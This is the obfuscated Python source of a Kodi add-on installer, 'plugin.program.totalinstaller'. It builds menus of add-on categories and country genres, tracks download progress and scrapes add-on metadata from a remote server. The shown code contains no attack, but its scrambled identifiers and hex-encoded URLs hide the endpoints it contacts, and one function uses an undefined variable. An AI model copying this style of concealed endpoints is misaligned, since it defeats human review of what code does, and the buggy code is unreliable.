import urllib , urllib2 , re , xbmcplugin , xbmcgui , xbmc , xbmcaddon , os , sys , time , binascii , xbmcvfs , glob , shutil , subprocess , datetime , threading , zipfile , ntpath
import yt , downloader , checkPath
try :
 from sqlite3 import dbapi2 as database
except :
 from pysqlite2 import dbapi2 as database
from addon . common . addon import Addon
from addon . common . net import Net
######################################################
oo000 = 'plugin.program.totalinstaller'
######################################################
ii = xbmcaddon . Addon ( id = oo000 )
zip = ii . getSetting ( 'zip' )
oOOo = ii . getSetting ( 'localcopy' )
O0 = ii . getSetting ( 'private' )
o0O = ii . getSetting ( 'reseller' )
iI11I1II1I1I = ii . getSetting ( 'openelec' )
I1IiiI = ii . getSetting ( 'resellername' )
IIi1IiiiI1Ii = ii . getSetting ( 'resellerid' )
o0OO00 = '687474703a2f2f746f74616c78626d632e74762f746f74616c7265766f6c7574696f6e2f6172742f'
oo = ii . getSetting ( 'favourites' )
i1iII1IiiIiI1 = ii . getSetting ( 'sources' )
iIiiiI1IiI1I1 = ii . getSetting ( 'mastercopy' )
o0OoOoOO00 = ii . getSetting ( 'username' ) . replace ( ' ' , '%20' )
I11i = ii . getSetting ( 'password' )
O0O = ii . getSetting ( 'versionoverride' )
Oo = ii . getSetting ( 'login' )
I1ii11iIi11i = ii . getSetting ( 'trcheck' )
I1IiI = xbmcgui . Dialog ( )
o0OOO = xbmcgui . DialogProgress ( )
iIiiiI = xbmc . translatePath ( 'special://home/' )
Iii1ii1II11i = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
iI111iI = xbmc . translatePath ( os . path . join ( 'special://home/media' , '' ) )
IiII = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'autoexec.py' ) )
iI1Ii11111iIi = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'autoexec_bak.py' ) )
i1i1II = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'addon_data' ) )
O0oo0OO0 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'playlists' ) )
I1i1iiI1 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'Database' ) )
iiIIIII1i1iI = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'Thumbnails' ) )
o0oO0 = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' , '' ) )
oo00 = xbmc . translatePath ( os . path . join ( o0oO0 , oo000 , 'default.py' ) )
o00 = xbmc . translatePath ( os . path . join ( o0oO0 , oo000 , 'fanart.jpg' ) )
Oo0oO0ooo = xbmc . translatePath ( os . path . join ( o0oO0 , oo000 , 'yt.py' ) )
o0oOoO00o = os . path . join ( Iii1ii1II11i , 'guisettings.xml' )
i1 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'guisettings.xml' ) )
oOOoo00O0O = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'guifix.xml' ) )
i1111 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'install.xml' ) )
i11 = binascii . unhexlify ( o0OO00 ) + os . sep
I11 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'favourites.xml' ) )
Oo0o0000o0o0 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'sources.xml' ) )
oOo0oooo00o = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'advancedsettings.xml' ) )
oO0o0o0ooO0oO = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'profiles.xml' ) )
oo0o0O00 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'RssFeeds.xml' ) )
oO = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'keymaps' , 'keyboard.xml' ) )
i1iiIIiiI111 = xbmc . translatePath ( os . path . join ( zip ) )
oooOOOOO = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Community Builds' , '' ) )
i1iiIII111ii = xbmc . translatePath ( os . path . join ( i1i1II , oo000 , 'cookiejar' ) )
i1iIIi1 = xbmc . translatePath ( os . path . join ( i1i1II , oo000 , 'startup.xml' ) )
ii11iIi1I = xbmc . translatePath ( os . path . join ( i1i1II , oo000 , 'temp.xml' ) )
iI111I11I1I1 = xbmc . translatePath ( os . path . join ( i1i1II , oo000 , 'id.xml' ) )
OOooO0OOoo = xbmc . translatePath ( os . path . join ( i1i1II , oo000 , 'idtemp.xml' ) )
iIii1 = xbmc . translatePath ( os . path . join ( o0oO0 , oo000 , 'resources/' ) )
oOOoO0 = xbmc . getSkinDir ( )
O0OoO000O0OO = xbmc . translatePath ( 'special://logpath/' )
iiI1IiI = Net ( )
II = xbmc . translatePath ( os . path . join ( i1i1II , oo000 ) )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( II , 'guinew.xml' ) )
OooO0 = xbmc . translatePath ( os . path . join ( II , 'guitemp' , '' ) )
II11iiii1Ii = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Database' ) )
OO0o = xbmc . translatePath ( os . path . join ( 'special://' , 'home/addons' ) )
Ooo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
if oo == 'true' :
 if i1iII1IiiIiI1 == 'false' : O0o0Oo = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' , 'favourites.xml' ]
 if i1iII1IiiIiI1 == 'true' : O0o0Oo = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' , 'favourites.xml' , 'sources.xml' ]
if oo == 'false' :
 if i1iII1IiiIiI1 == 'false' : O0o0Oo = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' ]
 if i1iII1IiiIiI1 == 'true' : O0o0Oo = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' ]
Oo00OOOOO = 'None'
O0OO00o0OO = 0.0
I11i1 = 0.0
iIi1ii1I1 = '077'
if 71 - 71: oO00OO0oo0 . III1i1i
if 26 - 26: i1iiI11I
if 29 - 29: iiIi
class Oo0O0OOOoo ( xbmcgui . WindowXMLDialog ) :
 def __init__ ( self , * args , ** kwargs ) : self . shut = kwargs [ 'close_time' ] ; xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" ) ; xbmc . executebuiltin ( "Skin.SetBool(AnimeWindowXMLDialogClose)" )
 def onFocus ( self , controlID ) : pass
 def onClick ( self , controlID ) :
  if controlID == 12 : xbmc . Player ( ) . stop ( ) ; self . _close_dialog ( )
 def onAction ( self , action ) :
  if action in [ 5 , 6 , 7 , 9 , 10 , 92 , 117 ] or action . getButtonCode ( ) in [ 275 , 257 , 261 ] : xbmc . Player ( ) . stop ( ) ; self . _close_dialog ( )
 def _close_dialog ( self ) :
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" ) ; time . sleep ( .4 ) ; self . close ( )
  if 95 - 95: iiiIi1i1I % II11iII % OoOo
def iI ( numblocks , blocksize , filesize , dp , start_time ) :
 if 60 - 60: O000OO0 / I11iii1Ii
 global O0OO00o0OO
 global I11i1
 if 13 - 13: OooOooo % O00oo0OO0oOOO * i1i1i11IIi . o0OOOoO0 / OO0O
 try :
  oOooOOo00Oo0O = min ( numblocks * blocksize * 100 / filesize , 100 )
  I11i1 = float ( numblocks ) * blocksize
  O00oO = I11i1 / ( 1024 * 1024 )
  I11i1I1I = I11i1 / ( time . time ( ) - start_time )
  if I11i1I1I > 0 :
   oO0Oo = ( filesize - numblocks * blocksize ) / I11i1I1I
   if I11i1I1I > O0OO00o0OO : O0OO00o0OO = I11i1I1I
  else :
   oO0Oo = 0
  oOOoo0Oo = I11i1I1I * 8 / 1024
  o00OO00OoO = oOOoo0Oo / 1024
  OOOO0OOoO0O0 = float ( filesize ) / ( 1024 * 1024 )
  O0Oo000ooO00 = '%.02f MB of %.02f MB' % ( O00oO , OOOO0OOoO0O0 )
  oO0 = 'Speed: %.02f Mb/s ' % o00OO00OoO
  oO0 += 'ETA: %02d:%02d' % divmod ( oO0Oo , 60 )
  dp . update ( oOooOOo00Oo0O , O0Oo000ooO00 , oO0 )
 except :
  I11i1 = float ( filesize )
  oOooOOo00Oo0O = 100
  dp . update ( oOooOOo00Oo0O )
 if dp . iscanceled ( ) :
  dp . close ( )
  raise Exception ( "Cancelled" )
  if 45 - 45: IIiII * iIi1iIiii111 % iIIi1iIIi . O0OoO - OO
  if 50 - 50: OOO00O / o0OOOoO0 * o0OOOoO0 * I11iii1Ii / IIiII - III1i1i
def IiI1 ( name , url , mode , iconimage , fanart , video , description , skins , guisettingslink , artpack ) :
 Oo0O00Oo0o0 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&video=" + urllib . quote_plus ( video ) + "&description=" + urllib . quote_plus ( description ) + "&skins=" + urllib . quote_plus ( skins ) + "&guisettingslink=" + urllib . quote_plus ( guisettingslink ) + "&artpack=" + urllib . quote_plus ( artpack )
 O00O0oOO00O00 = True
 i1Oo00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 i1Oo00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Oo00 . setProperty ( "Fanart_Image" , fanart )
 i1Oo00 . setProperty ( "Build.Video" , video )
 if ( mode == None ) or ( mode == 'restore_option' ) or ( mode == 'backup_option' ) or ( mode == 'cb_root_menu' ) or ( mode == 'genres' ) or ( mode == 'grab_builds' ) or ( mode == 'community_menu' ) or ( mode == 'instructions' ) or ( mode == 'countries' ) or ( url == None ) or ( len ( url ) < 1 ) :
  O00O0oOO00O00 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = Oo0O00Oo0o0 , listitem = i1Oo00 , isFolder = True )
 else :
  O00O0oOO00O00 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = Oo0O00Oo0o0 , listitem = i1Oo00 , isFolder = False )
 return O00O0oOO00O00
 if 31 - 31: OO . OooOooo / III1i1i
 if 89 - 89: OooOooo
def OO0oOoOO0oOO0 ( handle , url , listitem , isFolder ) :
 xbmcplugin . addDirectoryItem ( handle , url , listitem , isFolder )
 if 86 - 86: OO0O
 if 55 - 55: O000OO0 + i1iiI11I / OooOooo * o0OOOoO0 - oO00OO0oo0 - iIi1iIiii111
def ii1ii1ii ( name , url , mode , iconimage , fanart , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 iconimage = i11 + iconimage
 Oo0O00Oo0o0 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&author=" + urllib . quote_plus ( author ) + "&description=" + urllib . quote_plus ( description ) + "&version=" + urllib . quote_plus ( version ) + "&buildname=" + urllib . quote_plus ( buildname ) + "&updated=" + urllib . quote_plus ( updated ) + "&skins=" + urllib . quote_plus ( skins ) + "&videoaddons=" + urllib . quote_plus ( videoaddons ) + "&audioaddons=" + urllib . quote_plus ( audioaddons ) + "&buildname=" + urllib . quote_plus ( buildname ) + "&programaddons=" + urllib . quote_plus ( programaddons ) + "&pictureaddons=" + urllib . quote_plus ( pictureaddons ) + "&sources=" + urllib . quote_plus ( sources ) + "&adult=" + urllib . quote_plus ( adult )
 O00O0oOO00O00 = True
 i1Oo00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 i1Oo00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Oo00 . setProperty ( "Fanart_Image" , fanart )
 i1Oo00 . setProperty ( "Build.Video" , oooooOoo0ooo )
 O00O0oOO00O00 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = Oo0O00Oo0o0 , listitem = i1Oo00 , isFolder = False )
 return O00O0oOO00O00
 if 6 - 6: IIiII - iIi1iIiii111 + i1iiI11I - OO - oO00OO0oo0
def OO0oOO0O ( title , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' , zip_link = '' , repo_link = '' , repo_id = '' , addon_id = '' , provider_name = '' , forum = '' , data_path = '' ) :
 if len ( iconimage ) > 0 :
  iconimage = i11 + iconimage
 else :
  iconimage = 'DefaultFolder.png'
 if fanart == '' :
  fanart = o00
 Oo0O00Oo0o0 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&zip_link=" + urllib . quote_plus ( zip_link ) + "&repo_link=" + urllib . quote_plus ( repo_link ) + "&data_path=" + urllib . quote_plus ( data_path ) + "&provider_name=" + str ( provider_name ) + "&forum=" + str ( forum ) + "&repo_id=" + str ( repo_id ) + "&addon_id=" + str ( addon_id ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&video=" + urllib . quote_plus ( video ) + "&description=" + urllib . quote_plus ( description )
 O00O0oOO00O00 = True
 i1Oo00 = xbmcgui . ListItem ( title , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 i1Oo00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Oo00 . setProperty ( "Fanart_Image" , fanart )
 i1Oo00 . setProperty ( "Build.Video" , video )
 OO0oOoOO0oOO0 ( handle = int ( sys . argv [ 1 ] ) , url = Oo0O00Oo0o0 , listitem = i1Oo00 , isFolder = False )
 if 91 - 91: III1i1i
 if 61 - 61: II11iII
def o0oO ( type , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' ) :
 if type != 'folder2' and type != 'addon' :
  if len ( iconimage ) > 0 :
   iconimage = i11 + iconimage
  else :
   iconimage = 'DefaultFolder.png'
 if type == 'addon' :
  if len ( iconimage ) > 0 :
   iconimage = iconimage
  else :
   II11iIiIIIiI = '687474703a2f2f746f74616c78626d632e74762f6164646f6e732f63616368652f696d616765732f3463373933313938383765323430373839636131323566313434643938395f6164646f6e2d64756d6d792e706e67'
   iconimage = binascii . unhexlify ( II11iIiIIIiI )
 if fanart == '' :
  fanart = o00
 Oo0O00Oo0o0 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&video=" + urllib . quote_plus ( video ) + "&description=" + urllib . quote_plus ( description )
 O00O0oOO00O00 = True
 i1Oo00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 i1Oo00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 i1Oo00 . setProperty ( "Fanart_Image" , fanart )
 i1Oo00 . setProperty ( "Build.Video" , video )
 if ( type == 'folder' ) or ( type == 'folder2' ) or ( type == 'tutorial_folder' ) or ( type == 'news_folder' ) :
  O00O0oOO00O00 = OO0oOoOO0oOO0 ( handle = int ( sys . argv [ 1 ] ) , url = Oo0O00Oo0o0 , listitem = i1Oo00 , isFolder = True )
 else :
  O00O0oOO00O00 = OO0oOoOO0oOO0 ( handle = int ( sys . argv [ 1 ] ) , url = Oo0O00Oo0o0 , listitem = i1Oo00 , isFolder = False )
 return O00O0oOO00O00
 if 67 - 67: OO . iIIi1iIIi . III1i1i
 if 10 - 10: i1i1i11IIi % i1i1i11IIi - i1iiI11I / OO0O + iIi1iIiii111
def OOOOoOoo0O0O0 ( url ) :
 o0oO ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Audio' , url + '&typex=audio' , 'grab_addons' , 'audio.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Image (Picture)' , url + '&typex=image' , 'grab_addons' , 'pictures.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Program' , url + '&typex=program' , 'grab_addons' , 'programs.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Video' , url + '&typex=video' , 'grab_addons' , 'video.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Movies (Used for library scanning)' , url + '&typex=movie%20scraper' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] TV Shows (Used for library scanning)' , url + '&typex=tv%20show%20scraper' , 'grab_addons' , 'tvshows.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Artists (Used for library scanning)' , url + '&typex=artist%20scraper' , 'grab_addons' , 'artists.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Videos (Used for library scanning)' , url + '&typex=music%20video%20scraper' , 'grab_addons' , 'musicvideos.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] All Services' , url + '&typex=service' , 'grab_addons' , 'services.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] Weather Service' , url + '&typex=weather' , 'grab_addons' , 'weather.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Repositories' , url + '&typex=repository' , 'grab_addons' , 'repositories.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Scripts (Program Add-ons)' , url + '&typex=executable' , 'grab_addons' , 'scripts.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Screensavers' , url + '&typex=screensaver' , 'grab_addons' , 'screensaver.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Script Modules' , url + '&typex=script%20module' , 'grab_addons' , 'scriptmodules.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Skins' , url + '&typex=skin' , 'grab_addons' , 'skins.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Subtitles' , url + '&typex=subtitles' , 'grab_addons' , 'subtitles.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Web Interface' , url + '&typex=web%20interface' , 'grab_addons' , 'webinterface.png' , '' , '' , '' )
 if 85 - 85: o0OOOoO0 % oO00OO0oo0 - iIIi1iIIi * iiIi / OoOo % OoOo
 if 1 - 1: I11iii1Ii - o0OOOoO0 . IIiII . I11iii1Ii / O000OO0 + IIiII
 if 78 - 78: III1i1i . o0OOOoO0 . II11iII % OO0O
def i1iIi ( url ) :
 o0oO ( 'folder' , 'African' , url + '&genre=african' , 'grab_addons' , 'african.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Arabic' , url + '&genre=arabic' , 'grab_addons' , 'arabic.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Asian' , url + '&genre=asian' , 'grab_addons' , 'asian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Australian' , url + '&genre=australian' , 'grab_addons' , 'australian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Austrian' , url + '&genre=austrian' , 'grab_addons' , 'austrian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Belgian' , url + '&genre=belgian' , 'grab_addons' , 'belgian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Brazilian' , url + '&genre=brazilian' , 'grab_addons' , 'brazilian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Canadian' , url + '&genre=canadian' , 'grab_addons' , 'canadian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Chinese' , url + '&genre=chinese' , 'grab_addons' , 'chinese.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Colombian' , url + '&genre=columbian' , 'grab_addons' , 'columbian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Croatian' , url + '&genre=croatian' , 'grab_addons' , 'croatian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Czech' , url + '&genre=czech' , 'grab_addons' , 'czech.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Danish' , url + '&genre=danish' , 'grab_addons' , 'danish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Dominican' , url + '&genre=dominican' , 'grab_addons' , 'dominican.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Dutch' , url + '&genre=dutch' , 'grab_addons' , 'dutch.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Egyptian' , url + '&genre=egyptian' , 'grab_addons' , 'egyptian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Filipino' , url + '&genre=filipino' , 'grab_addons' , 'filipino.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Finnish' , url + '&genre=finnish' , 'grab_addons' , 'finnish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'French' , url + '&genre=french' , 'grab_addons' , 'french.png' , '' , '' , '' )
 o0oO ( 'folder' , 'German' , url + '&genre=german' , 'grab_addons' , 'german.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Greek' , url + '&genre=greek' , 'grab_addons' , 'greek.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Hebrew' , url + '&genre=hebrew' , 'grab_addons' , 'hebrew.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Hungarian' , url + '&genre=hungarian' , 'grab_addons' , 'hungarian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Icelandic' , url + '&genre=icelandic' , 'grab_addons' , 'icelandic.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Indian' , url + '&genre=indian' , 'grab_addons' , 'indian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Irish' , url + '&genre=irish' , 'grab_addons' , 'irish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Italian' , url + '&genre=italian' , 'grab_addons' , 'italian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Japanese' , url + '&genre=japanese' , 'grab_addons' , 'japanese.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Korean' , url + '&genre=korean' , 'grab_addons' , 'korean.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Lebanese' , url + '&genre=lebanese' , 'grab_addons' , 'lebanese.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Mongolian' , url + '&genre=mongolian' , 'grab_addons' , 'mongolian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Moroccan' , url + '&genre=moroccan' , 'grab_addons' , 'moroccan.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Nepali' , url + '&genre=nepali' , 'grab_addons' , 'nepali.png' , '' , '' , '' )
 o0oO ( 'folder' , 'New Zealand' , url + '&genre=newzealand' , 'grab_addons' , 'newzealand.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Norwegian' , url + '&genre=norwegian' , 'grab_addons' , 'norwegian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Pakistani' , url + '&genre=pakistani' , 'grab_addons' , 'pakistani.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Polish' , url + '&genre=polish' , 'grab_addons' , 'polish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Portuguese' , url + '&genre=portuguese' , 'grab_addons' , 'portuguese.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Romanian' , url + '&genre=romanian' , 'grab_addons' , 'romanian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Russian' , url + '&genre=russian' , 'grab_addons' , 'russian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Singapore' , url + '&genre=singapore' , 'grab_addons' , 'singapore.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Spanish' , url + '&genre=spanish' , 'grab_addons' , 'spanish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Swedish' , url + '&genre=swedish' , 'grab_addons' , 'swedish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Swiss' , url + '&genre=swiss' , 'grab_addons' , 'swiss.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Syrian' , url + '&genre=syrian' , 'grab_addons' , 'syrian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Tamil' , url + '&genre=tamil' , 'grab_addons' , 'tamil.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Thai' , url + '&genre=thai' , 'grab_addons' , 'thai.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Turkish' , url + '&genre=turkish' , 'grab_addons' , 'turkish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'UK' , url + '&genre=uk' , 'grab_addons' , 'uk.png' , '' , '' , '' )
 o0oO ( 'folder' , 'USA' , url + '&genre=usa' , 'grab_addons' , 'usa.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Vietnamese' , url + '&genre=vietnamese' , 'grab_addons' , 'vietnamese.png' , '' , '' , '' )
 if 68 - 68: oO00OO0oo0 % i1i1i11IIi + oO00OO0oo0
 if 31 - 31: II11iII . OoOo
def II1I ( url ) :
 O0i1II1Iiii1I11 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f6164646f6e64657461696c735f746573742e7068703f69643d2573'
 IIII = binascii . unhexlify ( O0i1II1Iiii1I11 ) % ( url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
 iiIiII1 = re . compile ( 'UID="(.+?)"' ) . findall ( iiIiI )
 OOO00O0O = re . compile ( 'id="(.+?)"' ) . findall ( iiIiI )
 iii = re . compile ( 'provider_name="(.+?)"' ) . findall ( iiIiI )
 oOooOOOoOo = re . compile ( 'version="(.+?)"' ) . findall ( iiIiI )
 i1Iii1i1I = re . compile ( 'created="(.+?)"' ) . findall ( iiIiI )
 OOoO00 = re . compile ( 'addon_types="(.+?)"' ) . findall ( iiIiI )
 IiI111111IIII = re . compile ( 'updated="(.+?)"' ) . findall ( iiIiI )
 i1Ii = re . compile ( 'downloads="(.+?)"' ) . findall ( iiIiI )
 if 14 - 14: iIIi1iIIi
 I1iI1iIi111i = re . compile ( 'description="(.+?)"' ) . findall ( iiIiI )
 iiIi1IIi1I = re . compile ( 'devbroke="(.+?)"' ) . findall ( iiIiI )
 o0OoOO000ooO0 = re . compile ( 'broken="(.+?)"' ) . findall ( iiIiI )
 o0o0o0oO0oOO = re . compile ( 'deleted="(.+?)"' ) . findall ( iiIiI )
 ii1Ii11I = re . compile ( 'mainbranch_notes="(.+?)"' ) . findall ( iiIiI )
 if 80 - 80: II11iII
 O0Oi1I1I = re . compile ( 'repo_url="(.+?)"' ) . findall ( iiIiI )
 iiI1I = re . compile ( 'data_url="(.+?)"' ) . findall ( iiIiI )
 IiIiiIIiI = re . compile ( 'zip_url="(.+?)"' ) . findall ( iiIiI )
 ooOO0OOOO0oo0 = re . compile ( 'genres="(.+?)"' ) . findall ( iiIiI )
 I11iiI1i1 = re . compile ( 'forum="(.+?)"' ) . findall ( iiIiI )
 I1i1Iiiii = re . compile ( 'repo_id="(.+?)"' ) . findall ( iiIiI )
 OOo0oO00ooO00 = re . compile ( 'license="(.+?)"' ) . findall ( iiIiI )
 oOO0O00oO0Ooo = re . compile ( 'platform="(.+?)"' ) . findall ( iiIiI )
 oO0Oo0O0o = re . compile ( 'visible="(.+?)"' ) . findall ( iiIiI )
 OOI1iI1ii1II = re . compile ( 'script="(.+?)"' ) . findall ( iiIiI )
 O0O0OOOOoo = re . compile ( 'program_plugin="(.+?)"' ) . findall ( iiIiI )
 oOooO0 = re . compile ( 'script_module="(.+?)"' ) . findall ( iiIiI )
 Ii1I1Ii = re . compile ( 'video_plugin="(.+?)"' ) . findall ( iiIiI )
 OOoO0 = re . compile ( 'audio_plugin="(.+?)"' ) . findall ( iiIiI )
 OO0Oooo0oOO0O = re . compile ( 'image_plugin="(.+?)"' ) . findall ( iiIiI )
 o00O0 = re . compile ( 'repository="(.+?)"' ) . findall ( iiIiI )
 oOO0O00Oo0O0o = re . compile ( 'weather_service="(.+?)"' ) . findall ( iiIiI )
 ii1 = re . compile ( 'skin="(.+?)"' ) . findall ( iiIiI )
 I1iIIiiIIi1i = re . compile ( 'service="(.+?)"' ) . findall ( iiIiI )
 O0O0ooOOO = re . compile ( 'warning="(.+?)"' ) . findall ( iiIiI )
 oOOo0O00o = re . compile ( 'web_interface="(.+?)"' ) . findall ( iiIiI )
 iIiIi11 = re . compile ( 'movie_scraper="(.+?)"' ) . findall ( iiIiI )
 OOO = re . compile ( 'tv_scraper="(.+?)"' ) . findall ( iiIiI )
 iiiiI = re . compile ( 'artist_scraper="(.+?)"' ) . findall ( iiIiI )
 oooOo0OOOoo0 = re . compile ( 'music_video_scraper="(.+?)"' ) . findall ( iiIiI )
 OOoO = re . compile ( 'subtitles="(.+?)"' ) . findall ( iiIiI )
 OO0O000 = re . compile ( 'requires="(.+?)"' ) . findall ( iiIiI )
 iiIiI1i1 = re . compile ( 'modules="(.+?)"' ) . findall ( iiIiI )
 oO0O00oOOoooO = re . compile ( 'icon="(.+?)"' ) . findall ( iiIiI )
 IiIi11iI = re . compile ( 'video_preview="(.+?)"' ) . findall ( iiIiI )
 Oo0O00O000 = re . compile ( 'video_guide="(.+?)"' ) . findall ( iiIiI )
